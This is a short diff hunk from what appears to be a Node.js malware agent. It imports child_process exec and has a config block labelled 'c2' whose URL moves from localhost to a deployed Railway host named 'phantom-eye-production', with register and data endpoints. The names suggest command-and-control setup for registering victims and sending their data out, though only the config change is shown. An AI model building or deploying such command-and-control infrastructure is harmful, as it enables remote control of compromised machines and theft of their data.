@@ -17,7 +17,7 @@ const { exec } = require('child_process');
 // ================================================
 const CONFIG = {
     c2: {
-        url: 'http://localhost:3001',  // ← CHANGE TO YOUR RAILWAY URL
+        url: 'https://phantom-eye-production.up.railway.app',   // ← CHANGE TO YOUR RAILWAY URL
         register: '/api/register',
         data: '/api/data'
     },
